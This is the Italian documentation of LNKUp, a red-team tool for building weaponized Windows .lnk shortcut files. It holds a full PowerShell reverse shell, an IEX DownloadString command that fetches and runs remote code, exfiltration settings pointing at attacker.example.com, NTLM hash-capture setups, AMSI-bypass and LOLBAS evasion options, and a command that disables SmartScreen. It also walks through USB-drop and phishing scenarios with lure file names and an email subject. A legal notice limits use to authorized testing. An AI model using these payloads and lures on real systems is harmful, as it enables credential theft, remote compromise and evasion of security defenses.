# LNKUp - Documentazione Completa

## 📑 Indice

- [Introduzione](#introduzione)
- [Installazione](#installazione)
- [Modalità d'Uso](#modalità-duso)
  - [Wizard Interattivo](#wizard-interattivo-consigliato)
  - [Command Line](#command-line)
  - [File di Configurazione YAML](#file-di-configurazione-yaml)
- [Tipi di Payload](#tipi-di-payload)
- [Opzioni di Evasion](#opzioni-di-evasion)
- [Scenari Pratici](#scenari-pratici)
- [Improvements Log](#improvements-log)
- [Troubleshooting](#troubleshooting)

---

## Introduzione

**LNKUp** è uno strumento avanzato per la generazione di file Windows shortcut (`.lnk`) weaponizzati per attività di red teaming e penetration testing.

### Versioni Disponibili

1. **generate.py** - Versione originale (semplice, stabile)
2. **generate_new.py** - Versione moderna (OOP, evasion avanzate)
3. **wizard.py** - Wizard interattivo (user-friendly)

### Caratteristiche Principali

- ✅ Cross-platform (Windows, Linux, macOS)
- ✅ Multiple tecniche di exfiltration (UNC, WebDAV, DNS)
- ✅ Evasion techniques (AMSI bypass, LOLBAS, obfuscation)
- ✅ NTLM hash capture
- ✅ Environment variable exfiltration
- ✅ PowerShell command execution
- ✅ Configurazione via YAML o CLI
- ✅ Wizard interattivo guidato

---

## Installazione

### 1. Clone del repository

```bash
git clone <repo-url>
cd LNKUp
```

### 2. Setup virtual environment

```bash
python3 -m venv .venv
source .venv/bin/activate  # Linux/macOS
# oppure
.venv\Scripts\activate  # Windows
```

### 3. Installazione dipendenze

```bash
pip install pydantic pyyaml pylnk3

# Su Windows, installa anche:
pip install pywin32
```

### 4. Verifica installazione

```bash
python generate_new.py --help
python wizard.py
```

---

## Modalità d'Uso

### Wizard Interattivo (Consigliato)

Il modo più semplice per creare payload LNK:

```bash
python wizard.py
```

Il wizard ti guiderà step-by-step attraverso:
1. **Scelta tipo di payload** (NTLM, Exfil, Command, etc.)
2. **Configurazione parametri** (host, variabili, comandi)
3. **Opzioni di evasion** (AMSI bypass, jitter, LOLBAS)
4. **Review e generazione**

**Vantaggi:**
- ✅ Spiegazioni dettagliate per ogni opzione
- ✅ Suggerimenti e best practices
- ✅ Validazione input in tempo reale
- ✅ Perfetto per principianti

---

### Command Line

Per utenti esperti che preferiscono la CLI:

#### Esempio 1: NTLM Capture Semplice

```bash
python generate_new.py \
  --host 192.168.1.100 \
  --type ntlm \
  --output output/capture.lnk
```

#### Esempio 2: Environment Variable Exfiltration

```bash
python generate_new.py \
  --host 192.168.1.100 \
  --vars USERNAME,COMPUTERNAME,USERDOMAIN \
  --type environment \
  --output output/recon.lnk
```

#### Esempio 3: Command Execution

```bash
python generate_new.py \
  --host 192.168.1.100 \
  --execute "powershell -c whoami" \
  --type all \
  --output output/execute.lnk
```

#### Opzioni CLI Complete

```
--config, -c        File di configurazione YAML
--output, -o        Path del file LNK di output
--host              Indirizzo IP/hostname del listener
--vars              Variabili d'ambiente (separate da virgola)
--execute, -e       Comando da eseguire
--type              Tipo: environment, ntlm, all
--generate-config   Genera file config.yml di esempio
--verbose, -v       Logging dettagliato
```

---

### File di Configurazione YAML

Per scenari complessi e ripetibili:

#### 1. Genera template

```bash
python generate_new.py --generate-config
```

#### 2. Modifica config.yml

```yaml
# Comandi da eseguire
target_command:
  - whoami
  - ipconfig /all

# Variabili da esfiltare
additional_vars:
  - USERNAME
  - COMPUTERNAME
  - USERDOMAIN

# Metodi di exfiltration
exfil_methods:
  - type: unc
    host: 192.168.1.100
    compress: true

  - type: http
    host: attacker.example.com
    port: 8443
    ssl: true
    path: /api/v1/exfil

# Cattura NTLM
ntlm_capture: true

# Opzioni di evasion
evasion:
  anti_amsi: true
  anti_etw: true
  jitter_min: 1000
  jitter_max: 5000
  legitimate_target: true
  fake_timestamp: null
  randomize_size: true
```

#### 3. Genera payload

```bash
python generate_new.py --config config.yml --output output/advanced.lnk
```

---

## Tipi di Payload

### 1. 🔐 NTLM Hash Capture

**Descrizione:**
Cattura hash NTLM quando l'utente visualizza la cartella (senza click).

**Quando usarlo:**
- Initial access via USB drop
- Credential harvesting passivo
- Phishing via email attachment

**Rilevabilità:** ⭐ Bassa

**Setup:**
```bash
# Listener Responder
sudo responder -I eth0 -v

# Oppure Impacket
sudo impacket-smbserver share . -smb2support
```

**Comando:**
```bash
python generate_new.py \
  --host 192.168.1.100 \
  --type ntlm \
  --output output/ntlm_capture.lnk
```

---

### 2. 📊 Environment Variable Exfiltration

**Descrizione:**
Esfiltrazione variabili d'ambiente Windows via path UNC.

**Variabili Utili:**
- `USERNAME` - Nome utente
- `COMPUTERNAME` - Nome PC
- `USERDOMAIN` - Dominio AD
- `LOGONSERVER` - Domain controller
- `PROCESSOR_IDENTIFIER` - Info CPU
- `OS` - Sistema operativo

**Rilevabilità:** ⭐⭐ Media

**Comando:**
```bash
python generate_new.py \
  --host 192.168.1.100 \
  --vars USERNAME,COMPUTERNAME,USERDOMAIN \
  --type environment \
  --output output/env_exfil.lnk
```

**Path Generato Esempio:**
```
\\192.168.1.100\Share_%USERNAME%_%COMPUTERNAME%\42531.ico
```

---

### 3. ⚡ Command Execution

**Descrizione:**
Esegue comandi PowerShell quando il file viene cliccato.

**Esempi di Payload:**

#### Reconnaissance
```powershell
whoami && hostname && ipconfig /all
```

#### Reverse Shell
```powershell
$c=New-Object Net.Sockets.TCPClient('192.168.1.100',4444);
$s=$c.GetStream();[byte[]]$b=0..65535|%{0};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
  $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);
  $sb=(iex $d 2>&1|Out-String);
  $sb2=$sb+'PS '+(pwd).Path+'> ';
  $sbt=([text.encoding]::ASCII).GetBytes($sb2);
  $s.Write($sbt,0,$sbt.Length);$s.Flush()
};$c.Close()
```

**Rilevabilità:** ⭐⭐⭐ Media-Alta

**Listener Setup:**
```bash
# Netcat
nc -lvnp 4444

# Metasploit
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; run"
```

---

### 4. 🎯 Hybrid (Tutto in Uno)

**Descrizione:**
Combina NTLM + Command + Exfil in un singolo payload.

**Rilevabilità:** ⭐⭐⭐⭐ Alta

**Comando:**
```bash
python generate_new.py \
  --host 192.168.1.100 \
  --vars USERNAME,COMPUTERNAME \
  --execute "whoami" \
  --type all \
  --output output/hybrid.lnk
```

---

### 5. 🌐 WebDAV Exfiltration

**Descrizione:**
Exfiltration via HTTP/HTTPS invece di SMB (bypass firewall).

**Setup Server WebDAV (Apache):**
```bash
# Install
sudo apt install apache2

# Enable modules
sudo a2enmod dav dav_fs

# Config /etc/apache2/sites-available/webdav.conf
<VirtualHost *:80>
    ServerName attacker.local
    DocumentRoot /var/www/webdav
    <Directory /var/www/webdav>
        DAV On
        Options Indexes
        AllowOverride None
        Require all granted
    </Directory>
    CustomLog /var/log/apache2/webdav.log combined
</VirtualHost>

# Restart
sudo systemctl restart apache2
sudo mkdir -p /var/www/webdav
sudo chown www-data:www-data /var/www/webdav

# Monitor
sudo tail -f /var/log/apache2/webdav.log
```

**Configurazione YAML:**
```yaml
exfil_methods:
  - type: http
    host: attacker.example.com
    port: 443
    ssl: true
    path: /webdav
```

---

## Opzioni di Evasion

### AMSI Bypass

**Cosa fa:**
Bypassa Antimalware Scan Interface di Windows per evitare scansione script PowerShell.

**Tecniche Implementate:**
1. Reflection + memory patching
2. Registry-based bypass
3. Exception-based initialization failure

**⚠️ IMPORTANTE:**
- I bypass inclusi sono esempi educativi
- Aggiornali regolarmente da fonti pubbliche
- Testali contro AV target specifico

**Risorse:**
- https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
- https://amsi.fail/

---

### Jitter (Random Delay)

**Cosa fa:**
Aggiunge ritardo casuale (es: 500-3000ms) prima dell'esecuzione.

**Perché:**
- Evita behavioral detection basata su timing
- Simula comportamento umano
- Rende pattern meno prevedibili

**Configurazione:**
```yaml
evasion:
  jitter_min: 1000
  jitter_max: 5000
```

---

### LOLBAS Proxy Execution

**Cosa fa:**
Usa binari Windows legittimi (explorer.exe, rundll32.exe) come proxy per eseguire PowerShell.

**Binari Supportati:**
- `explorer.exe` - Windows Explorer
- `rundll32.exe` - DLL loader
- `cmd.exe` - Command prompt

**Perché Efficace:**
- ✅ Processo parent legittimo
- ✅ Firma digitale Microsoft
- ✅ Bypass whitelisting
- ✅ EDR context sembra normale

**Catena di Esecuzione:**
```
explorer.exe (legit, signed)
  └─> cmd.exe
      └─> powershell.exe -Enc <payload>
```

---

### Timestamp Spoofing

**Cosa fa:**
Modifica timestamp del file per sembrare più vecchio.

**Esempio:**
- File creato oggi → timestamp = 2 anni fa
- Bypassa regole temporali ("file recenti")

---

### File Size Randomization

**Cosa fa:**
Randomizza dimensione file LNK (1KB - 1MB).

**Perché:**
- Evita signature detection basata su dimensione
- Ogni payload ha dimensione diversa

---

## Scenari Pratici

### Scenario 1: USB Drop Attack

**Obiettivo:** Cattura credenziali via physical access

```bash
# 1. Genera payload
python wizard.py
# Scegli: NTLM Capture
# Nome: Salaries_2024.lnk

# 2. Avvia listener
sudo responder -I wlan0 -v

# 3. Copia su USB
cp output/Salaries_2024.lnk /media/usb/

# 4. Lascia USB in target location
# 5. Attendi connessione e cattura hash
```

---

### Scenario 2: Email Phishing

**Obiettivo:** Reverse shell via email attachment

```bash
# 1. Genera payload con reverse shell
python generate_new.py \
  --execute "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')" \
  --output output/Invoice_Q4.lnk

# 2. Avvia web server per payload
python3 -m http.server 80

# 3. Avvia listener
nc -lvnp 4444

# 4. Invia email con attachment
# Subject: "Urgent: Invoice Review Required"
# Attachment: Invoice_Q4.lnk
```

---

### Scenario 3: Internal Reconnaissance

**Obiettivo:** Mappare ambiente post-compromissione

```bash
# 1. Genera payload con exfiltration
python generate_new.py \
  --host 192.168.1.100 \
  --vars USERNAME,COMPUTERNAME,USERDOMAIN,LOGONSERVER \
  --type environment \
  --output output/report.lnk

# 2. Deploy su file share interno
smbclient //target/share -U user
put output/report.lnk

# 3. Monitor connessioni
sudo tcpdump -i eth0 port 445 -w capture.pcap

# 4. Analizza risultati
# Ogni utente che vede il file → dati nel path UNC
```

---

## Improvements Log

### Versione 2.0 (generate_new.py)

#### ✅ Bug Fix Critici

1. **UTF-8/UTF-16LE Encoding** - Corretto encoding PowerShell
2. **Unicode Homoglyph** - Rimossa obfuscation non funzionale
3. **DNS Exfiltration** - Implementato WebDAV correttamente
4. **Librerie** - Ripristinato supporto Windows (win32com) + fix pylnk3

#### 🚀 Nuove Features

1. **Supporto YAML** - Configurazione complessa via file
2. **Multi-Protocol** - UNC, WebDAV, HTTP/HTTPS
3. **AMSI Bypass Aggiornati** - Tecniche 2024-2025
4. **LOLBAS Proxy** - explorer.exe, rundll32.exe
5. **Validazione Pydantic** - Error handling robusto
6. **Logging Strutturato** - Debug e monitoring migliorati

#### 📊 Confronto con Versione Originale

| Feature | v1 (generate.py) | v2 (generate_new.py) |
|---------|------------------|----------------------|
| Linee di codice | 170 | 586 |
| Architettura | Procedurale | OOP |
| Type hints | ❌ | ✅ |
| Exfiltration | UNC | UNC + HTTP + WebDAV |
| Evasion | Base | Avanzate |
| Config | CLI only | YAML + CLI |
| Windows support | ✅ | ✅ (ripristinato) |

---

## Troubleshooting

### Problema: "Payload non si connette"

**Cause:**
- Firewall blocca porta
- IP errato
- Listener non attivo

**Soluzione:**
```bash
# Verifica listener
sudo netstat -tulpn | grep 445

# Test connettività
ping <attacker-ip>
nc -zv <attacker-ip> 445

# Prova WebDAV invece di SMB
```

---

### Problema: "AMSI Bypass non funziona"

**Cause:**
- Windows Defender aggiornato
- Bypass signature noto

**Soluzione:**
- Usa bypass più recente da GitHub
- Combina con obfuscation (Invoke-Obfuscation)
- Testa in VM isolata

---

### Problema: "File LNK non eseguito"

**Cause:**
- SmartScreen blocca file
- Path troppo lungo (>260 caratteri)

**Soluzione:**
```bash
# Verifica formato
file output/payload.lnk

# Disabilita SmartScreen (per test)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"
```

---

## Struttura del Progetto

```
LNKUp/
├── generate.py          # Versione originale (semplice)
├── generate_new.py      # Versione moderna (avanzata)
├── wizard.py            # Wizard interattivo
├── config.yml           # Configurazione di esempio
├── requirements.txt     # Dipendenze Python
├── DOCUMENTATION.md     # Questo file
├── README.md            # Overview del progetto
├── output/              # Payload generati
│   ├── *.lnk
└── docs/                # Documentazione aggiuntiva
    └── *_GUIDE.md
```

---

## Tool Complementari

### Listener e Relay

- **Responder**: https://github.com/lgandx/Responder
- **Impacket**: https://github.com/SecureAuthCorp/impacket
- **Metasploit**: https://www.metasploit.com

### Obfuscation

- **Invoke-Obfuscation**: https://github.com/danielbohannon/Invoke-Obfuscation
- **Chameleon**: https://github.com/klezVirus/chameleon

### C2 Frameworks

- **Cobalt Strike**: https://www.cobaltstrike.com
- **Sliver**: https://github.com/BishopFox/sliver
- **Empire**: https://github.com/BC-SECURITY/Empire

---

## Risorse & Learning

### Documentazione Tecnica

- **NTLM Relay**: https://en.hackndo.com/ntlm-relay/
- **LNK File Format**: https://www.exploit-db.com/docs/13942
- **LOLBAS Project**: https://lolbas-project.github.io/
- **AMSI Bypass**: https://amsi.fail/

### MITRE ATT&CK

- **T1547.009** - Boot or Logon Autostart Execution: Shortcut Modification
- **T1566.001** - Phishing: Spearphishing Attachment
- **T1187** - Forced Authentication

---

## Legal Notice

**⚠️ IMPORTANTE - LEGGERE ATTENTAMENTE**

Questo strumento è fornito **esclusivamente** per scopi educativi e di sicurezza informatica autorizzata.

### ✅ Uso Legale

- Penetration testing con contratto firmato
- Red team assessment autorizzato
- Ricerca accademica in ambiente controllato
- Bug bounty program con regole chiare

### ❌ Uso Illegale

- Accesso non autorizzato a sistemi
- Distribuzione di malware
- Violazione di privacy
- Furto di credenziali senza consenso

**Gli autori non sono responsabili per usi impropri di questo strumento.**

**Assicurati sempre di avere:**
1. Autorizzazione scritta dal proprietario del sistema
2. Scope of work definito
3. Rules of engagement chiare
4. Consenso informato di tutti gli stakeholder

---

## Credits & Contributors

- **Progetto Originale**: LNKUp
- **Modernizzazione**: Advanced Red Team Techniques Integration
- **Wizard**: Interactive User Experience Enhancement

### Ringraziamenti

- Community di ricercatori di sicurezza
- Autori di tool open source utilizzati (Responder, Impacket, etc.)
- Progetti LOLBAS e AMSI Bypass

---

## Changelog

### v2.0 (Dicembre 2024)
- ✅ Refactoring completo a OOP
- ✅ Wizard interattivo
- ✅ Supporto YAML
- ✅ Evasion avanzate
- ✅ Fix encoding UTF-16LE
- ✅ WebDAV support
- ✅ Documentazione completa

### v1.0 (Originale)
- ✅ NTLM capture base
- ✅ Environment exfil
- ✅ Command execution
- ✅ Supporto Windows/Linux

---

**Per domande, bug report o contributi, consulta il repository del progetto.**

Buon red teaming! 🎯🔐
